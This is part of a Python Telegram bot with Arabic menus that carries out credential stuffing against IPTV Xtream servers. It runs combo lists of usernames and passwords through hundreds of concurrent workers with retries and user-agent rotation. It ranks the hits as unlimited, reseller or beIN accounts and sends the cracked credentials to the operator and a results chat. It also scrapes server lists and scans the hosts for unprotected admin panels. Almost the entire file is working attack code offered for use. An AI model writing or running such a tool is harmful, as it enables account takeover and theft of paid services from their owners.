            case "hunt":   await do_hunt(q, ctx, uid, st, pay)
            case "mac":    await do_mac(q, ctx, uid, st, pay)
            case "combo":  await do_combo(q, ctx, uid, st, pay)
            case "res":    await do_res(q, ctx, uid, st, pay)
            case "hlth":   await do_health(q, ctx, uid, st, pay)
            case "gen":    await do_gen(q, ctx, uid, st, pay)
            case "cfg":    await do_cfg(q, ctx, uid, st, pay)
            case "stat":   await _stat(q, uid, st)
            case "single": await _single_menu(q, ctx, uid, st)
            case "srv":    await do_srv(q, ctx, uid, st, pay)
            case "adapt":  await do_adapt(q, ctx, uid, st, pay)
            case "arch":   await do_arch(q, ctx, uid, st, pay)
            case "adm":    await do_admin_hunt(q, ctx, uid, st, pay)
            case "sched":  await do_schedule(q, ctx, uid, st, pay)
            case "help":   await _help(q)
    except Exception:
        log.error("CB[%s]: %s", q.data, traceback.format_exc())


async def _nav(q, dest: str, st: dict):
    if dest == "main":
        total = len(st["results"]) + len(st["mac_results"])
        act   = sum(1 for r in st["results"] if r["is_active"])
        bein  = sum(1 for r in st["results"] + st["mac_results"] if r["has_bein"])
        unlim = sum(1 for r in st["results"] if r.get("is_unlimited"))
        stat  = "🟢 نشط" if (st["running"] or st["mac_running"]) else ("⏸ مؤقف" if st["paused"] else "⚫ جاهز")
        await safe_edit(
            q.message,
            f"╔{'═'*38}╗\n║   🎯   {BOT_NAME}   {VERSION}   ║\n╚{'═'*38}╝\n"
            f"\n{_LINE_MID}\n"
            f"🏆  إصابات  <b>{total}</b>   ·   ✅ نشطة  <b>{act}</b>   ·   ♾️ Unlimited  <b>{unlim}</b>\n"
            f"⚽  beIN  <b>{bein}</b>   ·   📡 MAC  <b>{st['mac_hits']}</b>\n"
            f"📋  الكومبو  <b>{_fmt_num(len(st['combo']))}</b>   ·   {stat}\n"
            f"{_LINE_MID}",
            kb_main(),
        )

# ════════════════════════════════════════════════════════════════
#  🚀  Hunt — صيد Xtream
# ════════════════════════════════════════════════════════════════
async def do_hunt(q, ctx, uid: int, st: dict, act: str):
    match act:
        case "menu":  await _hunt_menu(q, st)
        case "start":
            if st["running"]:
                await q.answer("⚠️ الصيد يعمل بالفعل!", show_alert=True); return
            srvs = [s.strip() for s in [st["server"]] + st["multi_servers"] if s.strip()]
            if not srvs:
                await q.answer("⚠️ حدد السيرفر أولاً!", show_alert=True); return
            if not st["combo"]:
                await q.answer("⚠️ أضف كومبو أولاً!", show_alert=True); return
            st["paused"] = False
            asyncio.create_task(run_hunt(q.message, ctx, uid, st, srvs))
            await q.answer("🚀 الصيد انطلق!")
        case "stop":
            st["stop_flag"] = True; st["running"] = False; st["paused"] = False
            await q.answer("⏹ تم الإيقاف")
        case "pause":
            if st["running"] and not st["paused"]:
                st["paused"] = True
                await q.answer("⏸ تم الإيقاف المؤقت", show_alert=True)
            elif st["paused"]:
                st["paused"] = False
                await q.answer("▶️ تم الاستئناف", show_alert=True)
            await _hunt_menu(q, st)
        case "loop":
            st["loop_mode"] = not st["loop_mode"]
            await q.answer(f"🔄 وضع التكرار: {'✅ مفعّل' if st['loop_mode'] else '❌ موقوف'}")
            await _hunt_menu(q, st)
        case "test":
            srvs = [s.strip() for s in [st["server"]] + st["multi_servers"] if s.strip()]
            if not srvs: await q.answer("⚠️ لا يوجد سيرفر!", show_alert=True); return
            await q.answer("🔌 جاري اختبار السيرفرات...")
            asyncio.create_task(_test_srvs(q.message, srvs, st["timeout"]))
        case "compare":
            await _srv_compare(q, st)
        case "clear":
            archived = auto_archive(st)
            st.update(results=[], checked=0, valid=0)
            await q.answer(f"🗑 تم المسح — أُرشف {archived}")
            await _hunt_menu(q, st)
        case "parallel":
            await _parallel_hunt_menu(q, ctx, uid, st)


async def _hunt_menu(q, st: dict):
    srv_n  = sum(1 for s in [st["server"]]+st["multi_servers"] if s.strip())
    pause_ic = "⏸ إيقاف مؤقت" if not st["paused"] else "▶️ استئناف"
    status = "🟢 <b>يعمل الآن</b>" if st["running"] else ("⏸ <b>مؤقف</b>" if st["paused"] else "⚫ متوقف")
    rate   = f"{st['valid']/st['checked']*100:.1f}%" if st["checked"] else "—"
    bein_n = sum(1 for r in st["results"] if r["has_bein"])
    arab_n = sum(1 for r in st["results"] if r.get("has_arabic"))
    unlim  = sum(1 for r in st["results"] if r.get("is_unlimited"))
    trial  = sum(1 for r in st["results"] if r.get("is_trial"))
    resel  = sum(1 for r in st["results"] if r.get("is_reseller"))
    act_n  = sum(1 for r in st["results"] if r["is_active"])
    srv_line = st["server"].replace("http://","")[:38] if st["server"] else "<i>لم يُحدَّد بعد</i>"
    await safe_edit(
        q.message,
        f"╔{'═'*36}╗\n"
        f"║   ⚡   محرك صيد Xtream {VERSION}   ║\n"
        f"╚{'═'*36}╝\n"
        f"\n"
        f"📡  الحالة:   {status}\n"
        f"🖥  السيرفر: <code>{srv_line}</code>\n"
        f"🌐  السيرفرات: <b>{srv_n}</b>   🧵 الخيوط: <b>{st['threads']}</b>\n"
        f"\n"
        f"{_LINE_MID}\n"
        f"📋  الكومبو     <b>{_fmt_num(len(st['combo']))}</b>\n"
        f"🔄  تكرار       {'✅' if st['loop_mode'] else '❌'}\n"
        f"{_LINE_MID}\n"
        f"✅  إصابات      <b>{len(st['results'])}</b>   (نشطة: <b>{act_n}</b>)\n"
        f"♾️  Unlimited   <b>{unlim}</b>   🧪 Trial: <b>{trial}</b>\n"
        f"👑  Reseller    <b>{resel}</b>   ⚽ beIN: <b>{bein_n}</b>\n"
        f"🌙  عربي        <b>{arab_n}</b>\n"
        f"🔢  فُحص        <b>{_fmt_num(st['checked'])}</b>   📈 معدل: <b>{rate}</b>",
        InlineKeyboardMarkup([
            [InlineKeyboardButton("▶️ بدء الصيد" if not st["running"] else "🟢 جارٍ…",
                                  callback_data="hunt:start"),
             InlineKeyboardButton("⏹ إيقاف", callback_data="hunt:stop")],
            [InlineKeyboardButton(f"{pause_ic}", callback_data="hunt:pause"),
             InlineKeyboardButton("🔌 اختبار السيرفر", callback_data="hunt:test")],
            [InlineKeyboardButton(f"🔄 تكرار {'✅' if st['loop_mode'] else '❌'}",
                                  callback_data="hunt:loop"),
             InlineKeyboardButton("⚡ صيد متوازي", callback_data="hunt:parallel")],
            [InlineKeyboardButton("📊 مقارنة السيرفرات", callback_data="hunt:compare"),
             InlineKeyboardButton("🎯 عرض النتائج",      callback_data="res:menu")],
            [InlineKeyboardButton("🗑 مسح النتائج", callback_data="hunt:clear")],
            _bkr(),
        ]),
    )


async def _test_srvs(msg, srvs: list, timeout: int):
    results = await asyncio.gather(*[ping_host(s, timeout) for s in srvs[:10]])
    lines   = [f"🔌 <b>اختبار السيرفرات</b>  ({len(srvs)})\n{_LINE_MID}"]
    for s, (ok, ms) in zip(srvs, results):
        grade = "A" if ms<200 else "B" if ms<500 else "C" if ms<1500 else "F"
        icon  = "🟢" if ok and ms<500 else "🟡" if ok else "🔴"
        lines.append(f"{icon} [{grade}]  {ms}ms\n   └ <code>{s.replace('http://','')[:42]}</code>")
    await msg.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def _parallel_hunt_menu(q, ctx, uid: int, st: dict):
    """صيد متوازي على عدة سيرفرات"""
    srvs = [s.strip() for s in [st["server"]] + st["multi_servers"] if s.strip()]
    if not srvs:
        await q.answer("⚠️ أضف سيرفرات أولاً في الإعدادات!", show_alert=True)
        return
    if not st["combo"]:
        await q.answer("⚠️ أضف كومبو أولاً!", show_alert=True)
        return
    if st["running"]:
        await q.answer("⚠️ الصيد يعمل بالفعل!", show_alert=True)
        return
    # تقسيم الكومبو على السيرفرات
    combo = st["combo"].copy()
    chunk = max(1, len(combo) // len(srvs))
    lines = [
        f"╔{'═'*34}╗\n║  ⚡  صيد متوازي على {len(srvs)} سيرفر  ║\n╚{'═'*34}╝\n",
        f"📋  الكومبو الكلي:  <b>{_fmt_num(len(combo))}</b>\n",
        f"🔀  توزيع تقريبي:  <b>{_fmt_num(chunk)}</b> لكل سيرفر\n",
        f"{_LINE_MID}",
    ]
    for i, s in enumerate(srvs[:5]):
        lines.append(f"<b>#{i+1}</b>  <code>{s.replace('http://','')[:38]}</code>")
    if len(srvs) > 5:
        lines.append(f"  +{len(srvs)-5} سيرفرات أخرى…")
    await safe_edit(q.message, "\n".join(lines),
        InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 ابدأ الصيد المتوازي", callback_data="hunt:start")],
            _bkr("hunt:menu"),
        ]))


async def _srv_compare(q, st: dict):
    """مقارنة السيرفرات بحسب عدد الإصابات"""
    srv_stats = defaultdict(lambda: {"hits":0,"active":0,"bein":0,"unlim":0,"trial":0,"resel":0})
    for r in st["results"]:
        h = r["host"]
        srv_stats[h]["hits"]   += 1
        srv_stats[h]["active"] += 1 if r["is_active"] else 0
        srv_stats[h]["bein"]   += 1 if r["has_bein"] else 0
        srv_stats[h]["unlim"]  += 1 if r.get("is_unlimited") else 0
        srv_stats[h]["trial"]  += 1 if r.get("is_trial") else 0
        srv_stats[h]["resel"]  += 1 if r.get("is_reseller") else 0

    sorted_srvs = sorted(srv_stats.items(), key=lambda x: x[1]["hits"], reverse=True)
    lines = [f"╔{'═'*34}╗\n║  📊  مقارنة السيرفرات  ║\n╚{'═'*34}╝\n"]
    if not sorted_srvs:
        lines.append("<i>لا توجد بيانات بعد — ابدأ الصيد</i>")
    for i, (host, s) in enumerate(sorted_srvs[:10], 1):
        medal = "🥇" if i==1 else "🥈" if i==2 else "🥉" if i==3 else f"<b>{i}.</b>"
        hs = host.replace("http://","")[:34]
        lines.append(
            f"{medal}  <code>{hs}</code>\n"
            f"   ✅{s['hits']}  🟢{s['active']}  ⚽{s['bein']}  ♾️{s['unlim']}  🧪{s['trial']}  👑{s['resel']}\n"
        )
    if not sorted_srvs:
        pass
    else:
        lines.append(f"\n{_LINE_MID}\n📊 إجمالي السيرفرات: <b>{len(sorted_srvs)}</b>")
    await safe_edit(q.message, "\n".join(lines),
        InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 تحديث", callback_data="hunt:compare"),
             InlineKeyboardButton("🔙 رجوع",   callback_data="hunt:menu")],
        ]))

# ════════════════════════════════════════════════════════════════
#  🏃  run_hunt — المحرك الفعلي مع إيقاف مؤقت وتكيف
# ════════════════════════════════════════════════════════════════
async def run_hunt(orig_msg, ctx, uid: int, st: dict, servers: list):
    st.update(running=True, stop_flag=False, paused=False, checked=0, valid=0,
              speed_log=[], peak_spd=0.0)
    start = time.time()
    combo = st["combo"].copy()

    # الصيد التكيفي — ترتيب الكومبو
    if st.get("adaptive_mode"):
        combo = _adaptive.sort_combo_by_priority(combo)

    thrs  = min(st["threads"], 300)
    to    = st["timeout"]
    retry = st["retry"]
    tasks_list = []
    for h, u, p in combo:
        if h:   tasks_list.append((h, u, p))
        else:
            for s in servers: tasks_list.append((s, u, p))
    total = len(tasks_list)
    prog  = await orig_msg.reply_text(
        f"╔{'═'*34}╗\n"
        f"║   🚀   الصيد انطلق!   ║\n"
        f"╚{'═'*34}╝\n"
        f"\n"
        f"📋  {_fmt_num(len(combo))} كومبو   🖥 {len(servers)} سيرفر\n"
        f"🔢  {_fmt_num(total)} محاولة   🧵 {thrs} خيط\n"
        f"🧠  تكيفي: {'✅' if st.get('adaptive_mode') else '❌'}   🔄 UA: {'✅' if st.get('ua_rotation') else '❌'}",
        parse_mode=ParseMode.HTML,
    )
    queue = asyncio.Queue()
    for item in tasks_list: await queue.put(item)
    hits = 0
    pool = SessionPool(limit=min(thrs*3, 500))
    sess = await pool.get()

    async def worker():
        nonlocal hits
        while not st["stop_flag"]:
            # انتظر إذا كان مؤقفاً
            while st["paused"] and not st["stop_flag"]:
                await asyncio.sleep(0.5)
            if st["stop_flag"]:
                break
            try:   host, user, pwd = queue.get_nowait()
            except asyncio.QueueEmpty: break
            data = None
            for _ in range(max(1, min(retry, 3))):
                data = await xtream_check(sess, host, user, pwd, to)
                if data: break
                await asyncio.sleep(0.1)
            st["checked"] += 1
            st["speed_log"].append((time.monotonic(), st["checked"]))
            st["srv_stats"][host]["checked"] += 1

            # تسجيل في المحرك التكيفي
            if st.get("adaptive_mode"):
                await _adaptive.record(user, pwd, data is not None)

            if data:
                acc = mk_xtream(host, user, pwd, data)
                if st["active_only"] and not acc["is_active"]:
                    queue.task_done(); continue

                # جلب المحتوى
                try:
                    info = await xtream_fetch_content(sess, host, user, pwd, to)
                    acc.update(
                        live_count=info["live_count"], vod_count=info["vod_count"],
                        series_count=info["series_count"], has_bein=info["has_bein"],
                        bein_chs=info["bein_chs"], m3u_lines=info["m3u_lines"],
                        has_arabic=info["has_arabic"], arabic_info=info["arabic_info"],
                    )
                except Exception:
                    pass

                # كشف Trial
                if st.get("detect_trial"):
                    trial_info = detect_trial_account(data)
                    acc.update(is_trial=trial_info["is_trial"], trial_reason=trial_info["trial_reason"])

                # كشف Reseller
                if st.get("detect_reseller"):
                    try:
                        res_info = await detect_sub_reseller(sess, host, user, pwd, to, data)
                        acc.update(
                            is_reseller=res_info["is_reseller"],
                            can_create=res_info["can_create"],
                        )
                    except Exception:
                        pass

                # كشف Abandoned
                if st.get("detect_abandoned"):
                    try:
                        ab_info = await detect_abandoned_server(
                            sess, host, user, pwd, to, data, acc["live_count"]
                        )
                        acc.update(
                            is_abandoned=ab_info["is_abandoned"],
                            abandoned_indicators=ab_info["indicators"],
                        )
                    except Exception:
                        pass

                st["results"].append(acc)
                st["valid"] += 1; hits += 1
                st["srv_stats"][host]["hits"] += 1
                spd = _speed(st["speed_log"])
                if spd > st["peak_spd"]: st["peak_spd"] = spd

                # تنبيه Unlimited
                if acc.get("is_unlimited"):
                    unlim_msg = (
                        f"♾️ <b>UNLIMITED ACCOUNT!</b>\n"
                        f"🖥 <code>{host.replace('http://','')[:40]}</code>\n"
                        f"👤 <b>{user}</b>  🔑 <b>{pwd}</b>\n"
                        f"📺 {acc['live_count']} قناة   🎬 {acc['vod_count']} فيلم"
                    )
                    await safe_send(ctx.bot, uid, unlim_msg)

                # تنبيه قائمة عربية
                ar_info = acc.get("arabic_info", {})
                if ar_info.get("has_arabic_list") or (ar_info.get("total_arabic", 0) >= 50):
                    ar_cnt  = ar_info.get("total_arabic", 0)
                    ar_pkgs = ar_info.get("arabic_pkgs", 0)
                    ar_top  = " · ".join(ar_info.get("arabic_chs", [])[:3])
                    ar_msg  = (
                        f"🌙 <b>قائمة عربية ضخمة!</b>\n"
                        f"🖥 <code>{host.replace('http://','')[:40]}</code>\n"
                        f"👤 <b>{user}</b>  🔑 <b>{pwd}</b>\n"
                        f"📺 {ar_cnt} قناة عربية   📦 {ar_pkgs} باقة\n"
                        f"  ╰ {ar_top}"
                    )
                    await safe_send(ctx.bot, uid, ar_msg)

                if st["tg_auto"]:  await safe_send(ctx.bot, uid, hit_xtream(acc))
                if RESULTS_CHAT:   await safe_send(ctx.bot, RESULTS_CHAT, hit_xtream(acc))

                # أرشفة تلقائية إذا وصلنا الحد
                if len(st["results"]) > _ARCHIVE_MAX:
                    auto_archive(st)

            queue.task_done()

    async def updater():
        while st["running"] and not st["stop_flag"]:
            await asyncio.sleep(1)  # تحديث كل ثانية
            done = st["checked"]
            pct  = int(done/total*100) if total else 0
            spd  = _speed(st["speed_log"])
            ela  = time.time() - start
            rem  = (total-done)/spd if spd>0 else 0
            bein = sum(1 for r in st["results"] if r["has_bein"])
            arab = sum(1 for r in st["results"] if r.get("has_arabic"))
            act  = sum(1 for r in st["results"] if r["is_active"])
            unlim= sum(1 for r in st["results"] if r.get("is_unlimited"))
            trial= sum(1 for r in st["results"] if r.get("is_trial"))
            resel= sum(1 for r in st["results"] if r.get("is_reseller"))
            pause_note = "\n⏸  <b>مؤقف مؤقتاً…</b>" if st["paused"] else ""
            await safe_edit(prog,
                f"⚡ <b>الصيد جارٍ...</b>{pause_note}\n"
                f"\n"
                f"[{_pbar(done,total)}]  <b>{pct}%</b>\n"
                f"\n"
                f"{_LINE_MID}\n"
                f"✅  صالح      <b>{st['valid']}</b>   (نشط: <b>{act}</b>)\n"
                f"❌  فاشل      <b>{done - st['valid']}</b>\n"
                f"🔢  فُحص      <b>{_fmt_num(done)}</b> / <b>{_fmt_num(total)}</b>\n"
                f"♾️  Unlimited  <b>{unlim}</b>   🧪 Trial: <b>{trial}</b>\n"
                f"👑  Reseller   <b>{resel}</b>   ⚽ beIN: <b>{bein}</b>\n"
                f"🌙  عربي       <b>{arab}</b>\n"
                f"{_LINE_MID}\n"
                f"⚡  السرعة    <b>{spd:.1f}</b>/s\n"
                f"⏱  الوقت     <b>{_fmt_time(ela)}</b>\n"
                f"🏁  متبقي     <b>{_fmt_time(rem) if spd>0 else '—'}</b>",
                InlineKeyboardMarkup([[
                    InlineKeyboardButton("⏸ إيقاف مؤقت" if not st["paused"] else "▶️ استئناف",
                                         callback_data="hunt:pause"),
                    InlineKeyboardButton("⏹ إيقاف كلي", callback_data="hunt:stop"),
                ]])
            )

    upd = asyncio.create_task(updater())
    rnd = 1
    while True:
        st["loop_round"] = rnd
        wks = [asyncio.create_task(worker()) for _ in range(thrs)]
        await asyncio.gather(*wks, return_exceptions=True)
        if not st["loop_mode"] or st["stop_flag"]: break
        rnd += 1
        random.shuffle(combo)
        for h, u, p in combo:
            for s in ([h] if h else servers): await queue.put((s, u, p))
        await safe_send(ctx.bot, uid,
            f"🔄 <b>جولة {rnd-1} انتهت</b>  →  بدء جولة {rnd}\n✅ إجمالي: <b>{hits}</b>")

    st["running"] = False; st["paused"] = False
    upd.cancel()
    await pool.close()
    ela   = time.time() - start
    bein  = sum(1 for r in st["results"] if r["has_bein"])
    act   = sum(1 for r in st["results"] if r["is_active"])
    unlim = sum(1 for r in st["results"] if r.get("is_unlimited"))
    arab  = sum(1 for r in st["results"] if r.get("has_arabic"))
    await safe_edit(prog,
        f"{'🎯' if hits else '✅'} <b>انتهى الصيد!</b>\n"
        f"\n{_LINE_MID}\n"
        f"✅  صالح      <b>{st['valid']}</b>   (نشط: <b>{act}</b>)\n"
        f"❌  فاشل      <b>{st['checked'] - st['valid']}</b>\n"
        f"🔢  فُحص      <b>{_fmt_num(st['checked'])}</b>\n"
        f"♾️  Unlimited  <b>{unlim}</b>\n"
        f"⚽  beIN      <b>{bein}</b>\n"
        f"🌙  عربي       <b>{arab}</b>\n"
        f"⚡  أعلى سرعة  <b>{st['peak_spd']:.1f}</b>/s\n"
        f"⏱  المدة      <b>{_fmt_time(ela)}</b>\n"
        f"{_LINE_MID}",
        InlineKeyboardMarkup([[
            InlineKeyboardButton("🎯 عرض النتائج", callback_data="res:menu"),
            InlineKeyboardButton("📊 مقارنة",       callback_data="hunt:compare"),
            InlineKeyboardButton("🔙 القائمة",      callback_data="nav:main"),
        ]]))

# ════════════════════════════════════════════════════════════════
#  🌐  مستخرج السيرفرات من الإنترنت
# ════════════════════════════════════════════════════════════════
async def do_srv(q, ctx, uid: int, st: dict, act: str):
    match act:
        case "fetch":
            await safe_edit(q.message,
                f"╔{'═'*34}╗\n║  🌐  استخراج السيرفرات  ║\n╚{'═'*34}╝\n\n"
                f"جاري جلب السيرفرات من مصادر معروفة…\n"
                f"📡 عدد المصادر: <b>{len(_SERVER_SOURCES)}</b>",
                InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 استخراج الآن", callback_data="srv:do_fetch")],
                    _bkr(),
                ]))
        case "do_fetch":
            await q.answer("⏳ جاري الاستخراج من الإنترنت…")
            pmsg = await q.message.reply_text(
                "🌐 <b>جاري الاستخراج…</b>\n⏳ قد يستغرق 30-60 ثانية",
                parse_mode=ParseMode.HTML
            )
            try:
                srvs = await fetch_servers_from_web()
                if srvs:
                    # إضافة السيرفرات المستخرجة
                    added = 0
                    for s in srvs:
                        if s not in st["multi_servers"] and s != st["server"]:
                            st["multi_servers"].append(s)
                            added += 1
                    await safe_edit(pmsg,
                        f"✅ <b>تم الاستخراج!</b>\n\n"
                        f"🌐  سيرفرات مُستخرجة:  <b>{len(srvs)}</b>\n"
                        f"➕  أُضيف جديد:         <b>{added}</b>\n"
                        f"📊  إجمالي السيرفرات:  <b>{len(st['multi_servers'])+1}</b>",
                        InlineKeyboardMarkup([[
                            InlineKeyboardButton("⚡ ابدأ الصيد", callback_data="hunt:menu"),
                            InlineKeyboardButton("⚙️ الإعدادات",  callback_data="cfg:menu"),
                        ]]))
                else:
                    await safe_edit(pmsg,
                        "⚠️ <b>لم يتم إيجاد سيرفرات</b>\n\n"
                        "تأكد من الاتصال بالإنترنت أو أضف السيرفرات يدوياً.",
                        _bk("nav:main"))
            except Exception as e:
                await safe_edit(pmsg, f"❌ خطأ: {e}", _bk("nav:main"))
        case "custom":
            ctx.user_data["w"] = "srv_custom_url"
            await safe_edit(q.message,
                "🌐 <b>مصدر مخصص</b>\n\nأرسل رابط الصفحة/الملف الذي يحتوي سيرفرات:\n"
                "<code>https://example.com/servers.txt</code>",
                _bk("nav:main"))

# ════════════════════════════════════════════════════════════════
#  🧠  الصيد التكيفي
# ════════════════════════════════════════════════════════════════
async def do_adapt(q, ctx, uid: int, st: dict, act: str):
    match act:
        case "menu":
            mode_ic  = "✅" if st.get("adaptive_mode") else "❌"
            ua_ic    = "✅" if st.get("ua_rotation") else "❌"
            trial_ic = "✅" if st.get("detect_trial") else "❌"
            resel_ic = "✅" if st.get("detect_reseller") else "❌"
            aband_ic = "✅" if st.get("detect_abandoned") else "❌"
            adm_ic   = "✅" if st.get("detect_admin") else "❌"
            await safe_edit(q.message,
                f"╔{'═'*34}╗\n║   🧠   صيد تكيفي ذكي   ║\n╚{'═'*34}╝\n\n"
                f"📊 <b>البادئات الأكثر نجاحاً:</b>\n"
                f"{_adaptive.stats_text()}\n\n"
                f"{_LINE_MID}\n"
                f"🧠  وضع تكيفي:      {mode_ic}\n"
                f"🔄  تدوير UA:        {ua_ic}\n"
                f"🧪  كشف Trial:       {trial_ic}\n"
                f"👑  كشف Reseller:    {resel_ic}\n"
                f"🗑️  كشف Abandoned:   {aband_ic}\n"
                f"🛡️  كشف Admin Panel: {adm_ic}",
                InlineKeyboardMarkup([
                    [InlineKeyboardButton(f"🧠 تكيفي {mode_ic}", callback_data="adapt:tog_adapt"),
                     InlineKeyboardButton(f"🔄 UA Rotation {ua_ic}", callback_data="adapt:tog_ua")],
                    [InlineKeyboardButton(f"🧪 Trial {trial_ic}", callback_data="adapt:tog_trial"),
                     InlineKeyboardButton(f"👑 Reseller {resel_ic}", callback_data="adapt:tog_resel")],
                    [InlineKeyboardButton(f"🗑️ Abandoned {aband_ic}", callback_data="adapt:tog_aband"),
                     InlineKeyboardButton(f"🛡️ Admin {adm_ic}", callback_data="adapt:tog_admin")],
                    [InlineKeyboardButton("🔄 إعادة تعلم", callback_data="adapt:reset")],
                    _bkr(),
                ]))
        case "tog_adapt":
            st["adaptive_mode"] = not st.get("adaptive_mode", True)
            await q.answer(f"🧠 تكيفي: {'✅' if st['adaptive_mode'] else '❌'}")
            await do_adapt(q, ctx, uid, st, "menu")
        case "tog_ua":
            st["ua_rotation"] = not st.get("ua_rotation", True)
            await q.answer(f"🔄 UA Rotation: {'✅' if st['ua_rotation'] else '❌'}")
            await do_adapt(q, ctx, uid, st, "menu")
        case "tog_trial":
            st["detect_trial"] = not st.get("detect_trial", False)
            await q.answer(f"🧪 كشف Trial: {'✅' if st['detect_trial'] else '❌'}")
            await do_adapt(q, ctx, uid, st, "menu")
        case "tog_resel":
            st["detect_reseller"] = not st.get("detect_reseller", False)
            await q.answer(f"👑 كشف Reseller: {'✅' if st['detect_reseller'] else '❌'}")
            await do_adapt(q, ctx, uid, st, "menu")
        case "tog_aband":
            st["detect_abandoned"] = not st.get("detect_abandoned", False)
            await q.answer(f"🗑️ كشف Abandoned: {'✅' if st['detect_abandoned'] else '❌'}")
            await do_adapt(q, ctx, uid, st, "menu")
        case "tog_admin":
            st["detect_admin"] = not st.get("detect_admin", False)
            await q.answer(f"🛡️ كشف Admin: {'✅' if st['detect_admin'] else '❌'}")
            await do_adapt(q, ctx, uid, st, "menu")
        case "reset":
            _adaptive._prefix_success.clear()
            _adaptive._prefix_total.clear()
            await q.answer("🔄 تم إعادة التعلم")
            await do_adapt(q, ctx, uid, st, "menu")

# ════════════════════════════════════════════════════════════════
#  📦  الأرشيف
# ════════════════════════════════════════════════════════════════
async def do_arch(q, ctx, uid: int, st: dict, act: str):
    arch = st["archive"]
    match act:
        case "menu":
            xtream_cnt = len(arch["results"])
            mac_cnt    = len(arch["mac_results"])
            unlim      = sum(1 for r in arch["results"] if r.get("is_unlimited"))
            bein       = sum(1 for r in arch["results"] + arch["mac_results"] if r.get("has_bein"))
            await safe_edit(q.message,
                f"╔{'═'*34}╗\n║   📦   الأرشيف التلقائي   ║\n╚{'═'*34}╝\n\n"
                f"📊 الأرشيف يخزن النتائج القديمة تلقائياً\n"
                f"🔢 حد النتائج النشطة: <b>{_ARCHIVE_MAX}</b>\n\n"
                f"{_LINE_MID}\n"
                f"⚡  Xtream مؤرشف:  <b>{xtream_cnt}</b>\n"
                f"📡  MAC مؤرشف:      <b>{mac_cnt}</b>\n"
                f"♾️  Unlimited:      <b>{unlim}</b>\n"
                f"⚽  beIN:           <b>{bein}</b>",
                InlineKeyboardMarkup([
                    [InlineKeyboardButton("💾 تصدير الأرشيف", callback_data="arch:export"),
                     InlineKeyboardButton("🗑 مسح الأرشيف",   callback_data="arch:clear")],
                    _bkr(),
                ]))
        case "export":
            all_r = arch["results"] + arch["mac_results"]
            if not all_r:
                await q.answer("⚠️ الأرشيف فارغ!", show_alert=True); return
            await q.answer("📦 جاري التصدير…")
            content = json.dumps(all_r, ensure_ascii=False, indent=2)
            bio = io.BytesIO(content.encode("utf-8"))
            await q.message.reply_document(
                InputFile(bio, filename=f"archive_{len(all_r)}.json"),
                caption=f"📦 <b>الأرشيف</b>  —  {len(all_r)} سجل",
                parse_mode=ParseMode.HTML
            )
        case "clear":
            arch["results"].clear()
            arch["mac_results"].clear()
            await q.answer("🗑 تم مسح الأرشيف")
            await do_arch(q, ctx, uid, st, "menu")

# ════════════════════════════════════════════════════════════════
#  🛡️  Admin Panel Hunter
# ════════════════════════════════════════════════════════════════
async def do_admin_hunt(q, ctx, uid: int, st: dict, act: str):
    match act:
        case "menu":
            found_count = sum(1 for r in st["results"] if r.get("admin_found"))
            open_count  = sum(1 for r in st["results"] if r.get("admin_open"))
            await safe_edit(q.message,
                f"╔{'═'*34}╗\n║   🛡️   Admin Panel Hunter   ║\n╚{'═'*34}╝\n\n"
                f"🔍 البحث عن لوحات تحكم مفتوحة أو ضعيفة\n\n"
                f"{_LINE_MID}\n"
                f"🛡️  لوحات مُكتشفة:       <b>{found_count}</b>\n"
                f"🔓  مفتوحة بدون حماية:   <b>{open_count}</b>\n"
                f"🔢  مسارات مفحوصة:       <b>{len(_ADMIN_PATHS)}</b>\n",
                InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔍 فحص من النتائج", callback_data="adm:scan_results"),
                     InlineKeyboardButton("🌐 فحص سيرفر مخصص", callback_data="adm:scan_custom")],
                    [InlineKeyboardButton("📋 عرض ما وُجد", callback_data="adm:show_found")],
                    _bkr(),
                ]))
        case "scan_results":
            all_r = st["results"]
            if not all_r:
                await q.answer("⚠️ لا توجد نتائج للفحص!", show_alert=True); return
            await q.answer(f"🔍 جاري فحص {len(all_r)} سيرفر...")
            pmsg = await q.message.reply_text(
                f"🛡️ <b>جاري فحص Admin Panels…</b>\n🔢 {len(all_r)} سيرفر",
                parse_mode=ParseMode.HTML
            )
            found_total = 0
            open_total  = 0
            connector = aiohttp.TCPConnector(ssl=False, limit=50)
            async with aiohttp.ClientSession(connector=connector,
                headers={"User-Agent": _rand_ua()}) as sess:
                # فحص كل سيرفر فريد
                checked_hosts = set()
                for r in all_r:
                    host = r["host"]
                    if host in checked_hosts:
                        continue
                    checked_hosts.add(host)
                    try:
                        admin_res = await detect_admin_panel(sess, host, st["timeout"])
                        if admin_res["found"]:
                            r["admin_found"] = True
                            r["admin_url"]   = admin_res["url"]
                            r["admin_open"]  = admin_res["open"]
                            found_total += 1
                            if admin_res["open"]:
                                open_total += 1
                                # إرسال تنبيه فوري
                                await safe_send(ctx.bot, uid,
                                    f"🔓 <b>OPEN ADMIN PANEL!</b>\n"
                                    f"🌐 <code>{host.replace('http://','')[:40]}</code>\n"
                                    f"🔗 <code>{admin_res['url'][:60]}</code>\n"
                                    f"📄 {admin_res['title'][:40]}"
                                )
                    except Exception:
                        continue
            await safe_edit(pmsg,
                f"🛡️ <b>انتهى فحص Admin Panels</b>\n\n"
                f"🔢  سيرفرات مفحوصة:      <b>{len(checked_hosts)}</b>\n"
                f"🛡️  لوحات مُكتشفة:       <b>{found_total}</b>\n"
                f"🔓  مفتوحة بدون حماية:   <b>{open_total}</b>",
                InlineKeyboardMarkup([[
                    InlineKeyboardButton("📋 عرض النتائج", callback_data="adm:show_found"),
                    InlineKeyboardButton("🔙 رجوع",         callback_data="adm:menu"),
                ]]))
        case "scan_custom":
            ctx.user_data["w"] = "adm_custom"
            await safe_edit(q.message,
                "🌐 <b>فحص Admin Panel مخصص</b>\n\nأرسل رابط السيرفر:",
                _bk("adm:menu"))
        case "show_found":
            found = [(r["host"], r.get("admin_url",""), r.get("admin_open",False))
                     for r in st["results"] if r.get("admin_found")]
            if not found:
                await q.answer("⚠️ لم يُكتشف أي لوحة تحكم بعد!", show_alert=True); return
            lines = [f"╔{'═'*34}╗\n║  🛡️  Admin Panels المكتشفة  ║\n╚{'═'*34}╝\n"]
            for host, url, is_open in found[:15]:
                hs = host.replace("http://","")[:32]
                open_tag = "  🔓 <b>OPEN!</b>" if is_open else ""
                lines.append(f"🛡️  <code>{hs}</code>{open_tag}\n   🔗 <code>{url[:50]}</code>")
